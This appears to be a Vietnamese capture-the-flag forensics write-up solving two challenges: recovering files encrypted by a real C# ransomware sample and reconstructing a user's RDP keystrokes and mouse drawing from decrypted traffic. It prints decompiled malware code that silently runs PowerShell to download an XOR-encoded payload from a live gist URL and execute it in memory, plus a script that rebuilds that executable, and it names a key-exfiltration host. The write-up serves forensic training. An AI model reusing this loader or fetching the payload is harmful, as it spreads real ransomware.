key = bytes.fromhex("5a985f65714e073c05cd2929c83f9c1861ed0bbbdeb726b556d94c5158feef0e")
data = bytes.fromhex("76313096070814191ae36a2dc52e8d93223300dff299666ee4d45a43bdbe3268747291c30afbfff7fd7fc0708f77a613dd1989cf16812a703eec43022476cf14fb6635c480024784ecd5c2ad21dfb163e234e85bdfcddf04767a958fb3bb9a")

data[:3] == b'v10'
iv = data[3:15]
ct_tag = data[15:]
ct = ct_tag[:-16]
tag = ct_tag[-16:]

cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
plaintext = cipher.decrypt_and_verify(ct, tag)
print('Key1 is: ' + plaintext.decode())
```

![image](https://hackmd.io/_uploads/ryHgAxdr-x.png)

**Key mới tìm được: 5d7952292072ac320e0d66108d47fbc4de306396cb8270cabdd855fa09b3ba69**
Sử dụng key này để decrypt db
![image](https://hackmd.io/_uploads/BkSqWRxOrbe.png)
khi tìm trong messages chúng ta sẽ thấy user được đưa một file salary.
![image](https://hackmd.io/_uploads/BJNfCgOrbe.png)
Khi vào message_attachments, chúng ta sẽ thấy tên file đầy đủ là salary_statistics.rar và đây là file sẽ lây nhiễm ransomware cho máy user.
![image](https://hackmd.io/_uploads/Sy17AedS-l.png)

Để khôi phục file này thì chúng ta sử dụng localkey có trong table này, sử dụng AES-CBC và 32 bytes đầu của key để decrypt được data của file nằm trong folder **attachments.noindex\8b.**
![image](https://hackmd.io/_uploads/SJGVRx_Bbl.png)
![image](https://hackmd.io/_uploads/SyUECedBZe.png)

Đổi tên file lại thành salary_statistics.bin và viết script giải mã
```python!
import base64
from Crypto.Cipher import AES

key = base64.b64decode("R5/KK7BDJTSSE/aVyHVQSsXuQm1O/8UOjAxKkNzSSFIfxuR6Tn26s6efsgHkoWbCGr5p3VFbOwLVD2HFE4jXjQ==")
key = key[:32]

data = open('salary_statistics.bin','rb').read()
iv = data[:16]

cipher = AES.new(key, AES.MODE_CBC, iv)

plaintext = cipher.decrypt(data[16:])
padding_len = plaintext[-1]
plaintext = plaintext[:-padding_len]

with open('salary_statistics.rar', 'wb') as f:
    f.write(plaintext)
```
![image](https://hackmd.io/_uploads/rJ8i0g_HZx.png)


Chúng ta được file `rar` chứa file `csv` bên trong. Tuy nhiên, nó lại bị lỗi gì đó với file.
![image](https://hackmd.io/_uploads/ryB3Rl_Hbl.png)


Có vẻ nó chứa malwares bên trong.
![image](https://hackmd.io/_uploads/SkFDamSMbg.png)
Khi kiểm tra bằng HxD, chúng ta sẽ thấy được còn có một file `Update.exe` move về thư mục `Startup` của Windows để thực hiện hành vi độc hại.
![image](https://hackmd.io/_uploads/HyQAAedSZg.png)

Trong file `csv`, sẽ có một chuỗi `base62`, decode sẽ ra được part 1 của flag.
![image](https://hackmd.io/_uploads/HkekkZOBWx.png)
![image](https://hackmd.io/_uploads/BySJyWOS-x.png)


**Part 1: W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-**

### Part 2
Ta vào thư mục `Startup` dump file `Update.exe` về phân tích.
![image](https://hackmd.io/_uploads/HJl-yb_HZx.png)

**`Vì là file mã độc thật nên nhớ tắt fw và cẩn thận đưa vào VM nhé! Tránh trường hợp lỡ tay double click thực thi!!`**
Nhét vào DIE thì biết file được viết bằng C#. 
![image](https://hackmd.io/_uploads/rkVm1-_rZg.png)

Sử dụng dnspy để phân tích
![image](https://hackmd.io/_uploads/B1q41Z_HZx.png)


```c#=
// ChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyoChiyo.yEA8oSg5e02FNWc6DpGE
// Token: 0x06000009 RID: 9 RVA: 0x0000244C File Offset: 0x0000064C
public static object f5Mo9y1FK1yJy4poW9CE(string pXqYfeWgCBZOAYUjYnh)
{
	RijndaelManaged rijndaelManaged = new RijndaelManaged();
	HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
	byte[] array = new byte[32];
	byte[] sourceArray = hashAlgorithm.ComputeHash(ACX0qTJzEzq40qP5qFxb.wVkaAAeCf6BeWi8Flwtq(NB2mi1VBTasdlkjLKlk123LKJyCoMW0Zb5dK9QwIjZ6W6wYeHriq.DhMybcleyUJ8bZbaqtAkL3FTz6SQ840xELBsFWt9yekNCVYQ1WgRtjL1bTF3));
	Array.Copy(sourceArray, 0, array, 0, 16);
	Array.Copy(sourceArray, 0, array, 15, 16);
	rijndaelManaged.Key = array;
	rijndaelManaged.Mode = 2;
	ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
	byte[] array2 = Convert.FromBase64String(pXqYfeWgCBZOAYUjYnh);
	return ACX0qTJzEzq40qP5qFxb.sJljw7gGxcYB8jRe1fPv(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
}
```

Ở phần đầu tiên, nó thực hiện giải mã các biến tĩnh trong code qua hàm `f5Mo9y1FK1yJy4poW9CE`. Hàm này lấy mã MD5 của 1 biến khác rồi tạo key, từ byte 0 tới byte 14 là 15 byte đầu của mã MD5 và 16 byte kế là mã MD5 đó, còn byte cuối sẽ là add pad 00 vào.
![image](https://hackmd.io/_uploads/B1QU1-dSbe.png)
![image](https://hackmd.io/_uploads/rJi81-drZe.png)




Thực hiện giải mã với key
![image](https://hackmd.io/_uploads/B1GOyZdSZe.png)
Vậy key thực sự là 
`2778f1b116440a912bc28ffa1c4b872778f1b116440a912bc28ffa1c4b870500`

Ở đây mình sẽ giải mã 2 biến cần sử dụng:
![image](https://hackmd.io/_uploads/B1oFyZdHWe.png)
![image](https://hackmd.io/_uploads/ryW5k-uS-l.png)

Quay lại hàm **main**
![image](https://hackmd.io/_uploads/HkYsJ-uBZe.png)


```c#=
string str = "Invoke-WebRequest -Uri '" + NB2mi1VBTasdlkjLKlk123LKJyCoMW0Zb5dK9QwIjZ6W6wYeHriq.ZIDZvDLAFbRYxsxkwMl1lB7DELyeP0rfiJNEILKuap1H9eXgbiPbiwGYX2g2 + "' | Select-Object -ExpandProperty Content";
string input = "";
ProcessStartInfo startInfo = new ProcessStartInfo
{
    FileName = "powershell.exe",
    Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + str + "\"",
    RedirectStandardOutput = true,
    RedirectStandardError = true,
    UseShellExecute = false,
    CreateNoWindow = true
};
using (Process process = new Process())
{
    process.StartInfo = startInfo;
    process.Start();
    input = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
}
MatchCollection matchCollection = Regex.Matches(input, "\\\\x([0-9A-Fa-f]{2})");
byte[] array = new byte[matchCollection.Count];
for (int i = 0; i < matchCollection.Count; i++)
{
    array[i] = ACX0qTJzEzq40qP5qFxb.LyHSmWJ0Vnpm9qdcd27J(matchCollection[i].Groups[1].Value, 16);
}
byte[] array2 = ACX0qTJzEzq40qP5qFxb.wVkaAAeCf6BeWi8Flwtq(NB2mi1VBTasdlkjLKlk123LKJyCoMW0Zb5dK9QwIjZ6W6wYeHriq.YiiPCCvj2fk1dJrm3DrFAWX4eBGrQ9S7Yrk1tApStYHhGabddvJ81zQzpgk8);
byte[] array3 = new byte[array.Length];
for (int j = 0; j < array.Length; j++)
{
    array3[j] = (array[j] ^ array2[j % array2.Length]);
}
Assembly assembly = Assembly.Load(array3);
MethodInfo entryPoint = assembly.EntryPoint;
if (entryPoint != null)
{
    object obj = null;
    if (!entryPoint.IsStatic)
    {
        obj = assembly.CreateInstance(entryPoint.DeclaringType.FullName);
    }
    object[] parameters;
    if (entryPoint.GetParameters().Length == 0)
    {
        parameters = null;
    }
    else
    {
        parameters = new object[]
        {
            new string[0]
        };
    }
    entryPoint.Invoke(obj, parameters);
}
```

Nó thực hiện tải nội dung từ biến `ZIDZvDLAFbRYxsxkwMl1lB7DELyeP0rfiJNEILKuap1H9eXgbiPbiwGYX2g2` rồi xor với biến `YiiPCCvj2fk1dJrm3DrFAWX4eBGrQ9S7Yrk1tApStYHhGabddvJ81zQzpgk8`(đây là 2 biến mình đã giải mã ở trên) để tạo 1 file thực thi rồi load nó vào bộ nhớ hiện tại đang thực thi rồi tự tìm entry point và thực thi luôn.

Ta có code để lấy file thực thi đó như sau:
```python3=
import requests

bien1 = "https://gist.githubusercontent.com/YoNoob841/6e84cf5e3f766ce3b420d2e4edcc6ab6/raw/57e4d9dcd9691cd6286e9552d448e413f62f8b1f/NjtvSTuePfCiiXpCDzCUiCVBifJnLu"
bien2 = "M1kar1"
bien2 = bien2.encode("utf-8")

response = requests.get(bien1)
data = response.text
data = data.split("\\x")[1:]

data = bytearray([int(i, 16) for i in data])

for i in range(len(data)):
    data[i] ^= bien2[i % len(bien2)]

with open("malwares.exe", "wb") as f:
    f.write(data)
```

Tiếp tục có 1 file code bằng C#, sử dụng dnSpy phân tích nó tiếp.
![image](https://hackmd.io/_uploads/rywJeWOS-x.png)


Entry point sẽ là class `UN`.
![image](https://hackmd.io/_uploads/H11xlbOSbl.png)
![image](https://hackmd.io/_uploads/rJrxgW_HZg.png)
![image](https://hackmd.io/_uploads/HJcelbuH-l.png)


Đầu tiên nó thực hiện để lại thông báo và file `Helper.exe`.
![image](https://hackmd.io/_uploads/rkt-lZuBZx.png)
![image](https://hackmd.io/_uploads/BkTbxbuBWg.png)

Tiếp theo nó thực hiện random key 32 byte rồi mã hóa base64. Biến `text` là lưu key.
![image](https://hackmd.io/_uploads/rkofxZdrWe.png)
![image](https://hackmd.io/_uploads/rkemxWdrWg.png)

Tiếp theo nó duyệt qua các file, mã hóa aes + base64 nội dung rồi đổi tên file thành .foooo.
![image](https://hackmd.io/_uploads/HkeVlW_HZx.png)
![image](https://hackmd.io/_uploads/SymEx-uHbl.png)
![image](https://hackmd.io/_uploads/r1cEg-_S-e.png)

Ở đây nó thực hiện mã hóa key bằng thuật toán RSA nhưng với giá trị exp khá nhỏ. Biến text4 lưu key đã mã hóa RSA.
![image](https://hackmd.io/_uploads/ByEUeZdrbg.png)
![image](https://hackmd.io/_uploads/SJFIlZOS-l.png)
![image](https://hackmd.io/_uploads/S1nUg-uH-l.png)
![image](https://hackmd.io/_uploads/BJyDlW_rbl.png)
![image](https://hackmd.io/_uploads/r1Gwe-_BWx.png)



Sau đó gửi key ra ngoài qua 1 kết nối tcp với IP `MTcyLjI1LjI0Mi4xOTc=` và PORT `MzEyNDU=`, decrypt base64: `172.25.242.197:31245`.

Giờ ta sẽ mở file pcap lên để lấy lại key.
![image](https://hackmd.io/_uploads/Bk5ig-OHZl.png)


Đã có key sau khi mã hóa RSA, giờ ta sẽ khôi phục key bằng cách giải mã RSA.
![image](https://hackmd.io/_uploads/H1TaeZOHZx.png)


Code giải mã key:
```python3=
from Crypto.Util.number import *
import libnum
import base64

exponent = """Cw=="""
e= int.from_bytes(base64.b64decode(exponent), byteorder='big')
ciphertext = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB8IC4Trih+khi8MyjTamCVBVadQHENaQxoOkz9SF8elWnrfIMICzVhwa1PIBP5x4MNcSCnAhjyu//ukvC5xkN/lbN1UpEwraijcFvwO4mEphW/gd2Z7lyORZ2zdVW3SNFCWVGIojzSl4Ph+xoHheJde9iAzT3z1fGT5NG5lWtV331u4SLZ8wVXc1zNNXklKRhYWlIVzagvjTdF26Wk6Vsld9JSkdiN+WZgz8Aka5FK4splAxPJX3VFtBxhLqCBWsqpuuOgAaLEuxxwc0vePe6DlvTxnntODCAZCEeDUe5C1+iUVieO7NeYyx1aFf75T0XdDZAKGSgW7HdM9DBMGMlVAEdCq3OTMbp+rTUkhsW3LZIrcVpGGBlkFy/a39xu5JnNzaJFCTtjy6kqDHhctfu6fsQ0dXrrHQN/UjiaitEdHMS7G3OTcaTqpf01nhPxlypaW+P28kW+YVTrFWJycUvglGBdmdbv2ttsoRpFE6tGXNDqnKRK4yr/8JPkH/mhMrruCYUZMIr2+R0HoDQxXm0BMOrBUUSzPxdXPD6hYwSma1AHeptmaRX5n+8gpeleweOGiJAFLoui5WDQeiEowBZZZJlKbbFGFIfwx722pdkEYVIuMfAxPIDUf21oJj01wHrBxQ=="
C = int.from_bytes(base64.b64decode(ciphertext), byteorder='big')

m=libnum.nroot(C,e)

key = long_to_bytes(m)
print(key)

#Wu/F6K9CnxuCS0ubNF5CEceMumb155dGnV2714cOp8g=
```
![image](https://hackmd.io/_uploads/HyAxZWurWe.png)


Có được key, ta có script giải mã AES như sau:

```python3=
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = "Wu/F6K9CnxuCS0ubNF5CEceMumb155dGnV2714cOp8g="

with open("Important_File_You_Need!!!.dat.foooo", "rb") as f:
    data = f.read()

key_bytes = base64.b64decode(key)
data = base64.b64decode(data)
iv = data[:16]
ciphertext = data[16:]
cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)

with open("Important_File_You_Need!!!.dat", "wb") as f:
    f.write(decrypted)
    
#MXNFQnFu...[REDACTED]...VRdg==
```
![image](https://hackmd.io/_uploads/SkaWWb_BWx.png)


> Flag: W1{7h15_155_7h3_f1rr57_fl4ff4g_s3ss1on_r3c0very-4nD-Brok3n_RSA_key_with_Sm4l1_Exp0n3nt!!Chiyochiyochiyo}

## Internet Plumber
I planted a backdoor in my friend's server and recorded his traffic. Please find out what he was doing.
Note: The flag is splitted into 4 different parts.

Challenge cho ta 1 file pcapng và 1 file sslkeylog, sử dụng file sslkeylog để có thể đọc được full traffic. Đề bài yêu cầu rằng ta hãy tìm hiểu xem user này đang làm gì, thì sau khi decrypt sslkeylog, ta có thể xem được đầy đủ các gói tin có sử dụng các protocols như http2, http3, rdp,... Vậy ta sẽ đi qua lần lượt các giao thức này để điều tra xem user đã làm gì.

### Part 1

Với part 1 thì khi mình filter theo http2 và quan sát thì mình đã tìm thấy 1 request vào `gist.githubusercontent.com` có endpoint là **part1.txt**
![image](https://hackmd.io/_uploads/HkXyfWdHZe.png)
![image](https://hackmd.io/_uploads/HkPkG-_BWe.png)



**Part 1: W1{AI_!s_g3T7|nG_Out-oF_h4nD_b|2**

### Part 2

Tiếp tục với http2, em thấy user truy cập vào 1 link **pastebin** với endpoint là **YG4RUwH0** đã bị khóa và anh ta nhập mật khẩu là 123.
![image](https://hackmd.io/_uploads/rk9gM-uHZg.png)

Mình thử vào link đó và thử với pass là 123 thì không thành công. Tiếp tục tìm kiếm trong protocol này thì không thấy password đâu. Sau đó mình chuyển qua phân tích các protocols **RDP**.

Đầu tiên là ta cần biết RDP là gì, thì **RDP(Remote Desktop Protocol)** là Giao thức Máy tính Từ xa của Microsoft, cho phép bạn truy cập và điều khiển máy tính khác (máy chủ) từ xa qua mạng như thể bạn đang ngồi trước màn hình đó.

Filter **RDP** ta thấy nó đã ghi lại dữ liệu từ bàn phím và chuột.
![image](https://hackmd.io/_uploads/SyTWzZOHWl.png)



Và mình lựa chọn công cụ **pyrdp** để phục dựng lại các phiên RDP.
Chi tiết tại: https://github.com/GoSecure/pyrdp

Đầu tiên ta sẽ export PDUs Layer 7 từ file pcapng challenge và convert từ pcapng về pcap.
![image](https://hackmd.io/_uploads/S1OXGZOr-l.png)




Sử dụng editcap để convert từ pcapng về pcap: `editcap -F libpcap layer7.pcapng layer7.pcap`
![image](https://hackmd.io/_uploads/rJ7VzbuBZe.png)

*Ở trên windows mình gặp chút vấn đề*
![image](https://hackmd.io/_uploads/ryO8MZ_rWe.png)

nên có thử chuyển sang linux và ok
![image](https://hackmd.io/_uploads/r1P_GbOBWx.png)


Tiếp theo sử dụng `pyrdp-convert` để tạo file replay.
![image](https://hackmd.io/_uploads/ByStzWuSZg.png)

Sau đây là những gì đã được nhập từ bàn phím:

```
--------------------
HOST: DESKTOP-NHMIO9E

--------------------

--------------------
USERNAME: admin
PASSWORD: 123
DOMAIN: 

--------------------

<Tab released>
<Shift released>
<Shift released>
<Control released>
<Control released>
<Tab released>
<Alt released>
<Tab released>
<Alt released>
<Tab released>
<Tab released>
<Shift released>
<Shift released>
<Control released>
<Control released>
<Tab released>
<Alt released>
<Tab released>
<Alt released>
<Tab released>
<Tab released>
<Meta released>
<Windows released>
<Shift released>
<Shift released>
<Control released>
<Control released>
<Tab released>
<Alt released>
<Tab released>
<Alt released>
<Tab released>
<Meta pressed>
<Meta released>powershe
<Return pressed>
<Return released>cd
<Space pressed>
<Space released>
<Shift pressed>D
<Shift released>ocuments
<Return pressed>
<Return released>echo
<Space pressed>
<Space released>d89
<Shift pressed>B
<Shift released>c
<Shift pressed>M
<Shift released>xb
<Shift pressed>Q
<Shift released>m
<Space pressed>
<Space released>
<Shift pressed>>
<Shift released>
<Space pressed>
<Space released>passwo
<Backspace pressed>
<Backspace released>d.txt
<Return pressed>
<Return released>echo
<Space pressed>
<Space released>h
<Backspace pressed>
<Backspace released>
<Shift pressed>_
<Shift released>https
<Shift pressed>:
<Shift released>//tinyurl.con/
<Backspace pressed>
<Backspace released>
<Backspace pressed>
<Backspace released>m/bp8fhx9z
<Space pressed>
<Space released>
<Shift pressed>>
<Shift released>
<Space pressed>
<Space released>part3.txt
<Return pressed>
<Return released>paint
<Return pressed>
<Return released>
<Tab released>
<Shift released>
<Shift released>
<Control released>
<Control released>
<Tab released>
<Alt released>
<Tab released>
<Alt released>
<Tab released>
<Tab released>
<Shift released>
<Shift released>
<Control released>
<Control released>
<Tab released>
<Alt released>
<Tab released>
<Alt released>
<Tab released>
```

Đầu tiên, ta đã có thể thấy được user đã cd vào Documents và ghi vào 1 file **password.txt** với nội dung là **d89BcMxbQm**

Lấy nó để mở khóa pastebin và có được part 2.
![image](https://hackmd.io/_uploads/SyW3z-OB-l.png)


**Part 2: uh_tA|<e_a_lO()k_at_tHi5_**

### Part 3

Đọc tiếp những gì được nhập từ bàn phím, anh ta tiếp tục ghi vào 1 file tên là **part3.txt** với nội dung là **_https://tinyurl.com/bp8fhx9z** và có lẽ cái link này chính là part 3 của flag.

**Part 3: _https://tinyurl.com/bp8fhx9z**

### Part 4

Tiếp theo, mình đã thấy user kéo chuột xuống dưới góc màn hình có lẽ là **Taskbar** và nhập paint. Sau đó user tiến hành vẽ gì đó. Bây giờ công việc của ta sẽ là convert lại đường di chuột đã vẽ ra cái gì ở paint.

Và đầu tiên, ta sẽ dùng `pyrdp-convert` để tạo file replay dạng json để có được dữ liệu di chuyển chuột là tọa độ x, y trên đồ thị. Sau đó sẽ code script để convert lại đường di chuyển của chuột dựa trên thời gian, dự đoán nhấp nhả chuột để ra hình đẹp nhất và dễ đọc nhất có thể(khúc này nên xài AI code để ra hình đẹp nhất có thể).


Sau hết giải thì author của chall này là anh **tr4c3datr4il** đã public source và vẽ ra rất đẹp.

<details>
<summary>solve.py</summary>

```python3=
import pyshark
import matplotlib.pyplot as plt
import numpy as np

SCANCODE_MAP = {
    0x1E: 'a', 0x30: 'b', 0x2E: 'c', 0x20: 'd', 0x12: 'e', 0x21: 'f',
    0x22: 'g', 0x23: 'h', 0x17: 'i', 0x24: 'j', 0x25: 'k', 0x26: 'l',
    0x32: 'm', 0x31: 'n', 0x18: 'o', 0x19: 'p', 0x10: 'q', 0x13: 'r',
    0x1F: 's', 0x14: 't', 0x16: 'u', 0x2F: 'v', 0x11: 'w', 0x2D: 'x',
    0x15: 'y', 0x2C: 'z',
    0x02: '1', 0x03: '2', 0x04: '3', 0x05: '4', 0x06: '5',
    0x07: '6', 0x08: '7', 0x09: '8', 0x0A: '9', 0x0B: '0',
    0x39: ' ', 0x1C: '\n', 0x0E: '[BACKSPACE]',
    0x0F: '[TAB]', 0x1D: '[CTRL]', 0x2A: '[SHIFT]', 0x38: '[ALT]',
    0x3A: '[CAPS]', 0x01: '[ESC]', 0x0C: '-', 0x0D: '=',
    0x1A: '[', 0x1B: ']', 0x2B: '\\', 0x27: ';', 0x28: "'",
    0x29: '`', 0x33: ',', 0x34: '.', 0x35: '/',
}


pcap = pyshark.FileCapture('challenge.pcapng', display_filter='rdp',
                           include_raw=True, 
                           use_json=True)

drag_segments = []
current_drag = []
is_dragging = False
typed_text = ""

packet_count = 0
for packet in pcap:
    packet_count += 1
    rdp_data = packet.rdp._all_fields
    
    if 'Mouse' in rdp_data.keys():
        mouse_data = rdp_data['Mouse']
        if not isinstance(rdp_data['Mouse'], list):
            mouse_data = [mouse_data]
        for data in mouse_data:
            xpos = int(data['rdp.pointer.xpos'])
            ypos = int(data['rdp.pointer.ypos'])
            is_move = data['rdp.pointerflags_tree']['rdp.pointerflags.move']
            is_button1 = data['rdp.pointerflags_tree']['rdp.pointerflags.button1']
            is_down = data['rdp.pointerflags_tree']['rdp.pointerflags.down']
            
            # Detect drag start: Move: 0, Button1: 1, Down: 1
            if is_move == '0' and is_button1 == '1' and is_down == '1':
                is_dragging = True
                current_drag = [(xpos, ypos)]
            
            # Detect drag end: Move: 0, Button1: 1, Down: 0
            elif is_move == '0' and is_button1 == '1' and is_down == '0':
                if is_dragging and len(current_drag) > 1:
                    drag_segments.append(current_drag)
                is_dragging = False
                current_drag = []
            
            # Collect movement during drag: Move: 1, Button1: 0, Down: 0
            elif is_move == '1' and is_button1 == '0' and is_down == '0':
                if is_dragging:
                    current_drag.append((xpos, ypos))

    elif 'Scancode' in rdp_data.keys():
        # print('Keyboard')
        scancode_data = rdp_data['Scancode']
        if not isinstance(scancode_data, list):
            scancode_data = [scancode_data]
        for data in scancode_data:
            keycode = int(data['rdp.fastpath.scancode.keycode'], 16)
            is_release = data['rdp.fastpath.eventheader_tree']['rdp.fastpath.scancode.release'] == '1'
            key_name = SCANCODE_MAP.get(keycode, f'[UNKNOWN_{keycode}]')
            # print(f"Key: {key_name}, Release: {is_release}")
            if not is_release:
                typed_text += key_name

pcap.close()

print(f"Typed text: {typed_text}")
print(f"Total drag segments found: {len(drag_segments)}")

# Flatten all drag points into a timeline
all_drag_points = []
for segment in drag_segments:
    all_drag_points.extend(segment)

if not all_drag_points:
    print("No drag points found")
    exit()

# Create animation
import matplotlib.animation as animation

fig, ax = plt.subplots(figsize=(10, 8))

# Set axis limits based on data
all_x = [x for x, y in all_drag_points]
all_y = [y for x, y in all_drag_points]
ax.set(xlim=[min(all_x)-50, max(all_x)+50], 
       ylim=[min(all_y)-50, max(all_y)+50],
       xlabel='X Position', 
       ylabel='Y Position')
ax.invert_yaxis()
ax.set_title(f'Mouse Drag Timeline ({len(drag_segments)} segments, {len(all_drag_points)} points)')

# Generate colors for each segment
colors = plt.cm.rainbow(np.linspace(0, 1, len(drag_segments)))

# Track which segments have been drawn
segment_lines = []
current_segment_idx = 0
current_point_in_segment = 0

def update(frame):
    global current_segment_idx, current_point_in_segment
    
    if current_segment_idx >= len(drag_segments):
        return segment_lines
    
    # Get current segment
    segment = drag_segments[current_segment_idx]
    
    # Add one more point to the current segment
    current_point_in_segment += 1
    
    # Draw the current segment up to current point
    if current_point_in_segment <= len(segment):
        points_to_draw = segment[:current_point_in_segment]
        x_coords = [x for x, y in points_to_draw]
        y_coords = [y for x, y in points_to_draw]
        
        # Remove old line for this segment if exists
        if current_segment_idx < len(segment_lines):
            segment_lines[current_segment_idx].remove()
            segment_lines[current_segment_idx] = ax.plot(x_coords, y_coords, 
                                                          color=colors[current_segment_idx], 
                                                          linewidth=2)[0]
        else:
            segment_lines.append(ax.plot(x_coords, y_coords, 
                                        color=colors[current_segment_idx], 
                                        linewidth=2)[0])
    
    # Move to next segment when current is complete
    if current_point_in_segment >= len(segment):
        current_segment_idx += 1
        current_point_in_segment = 0
    
    return segment_lines

ani = animation.FuncAnimation(fig=fig, 
                              func=update, 
                              frames=len(all_drag_points), 
                              interval=0.01, 
                              blit=True, 
                              repeat=False)

ani.save(filename="mouse_drag_timeline.gif", writer="pillow")
print("Timeline animation saved to mouse_drag_timeline.gif")
plt.show()
```
    
</details>

![image](https://hackmd.io/_uploads/Byex7ZuBbx.png)


**Part 4: _06cc5fc57a}**

> Flag: W1\{AI\_!s\_g3T7\|nG\_Out-oF\_h4nD\_b\|2uh\_tA\|<e\_a\_lO()\_k\_at\_tHi5\__https://tinyurl.com/bp8fhx9z_06cc5fc57a}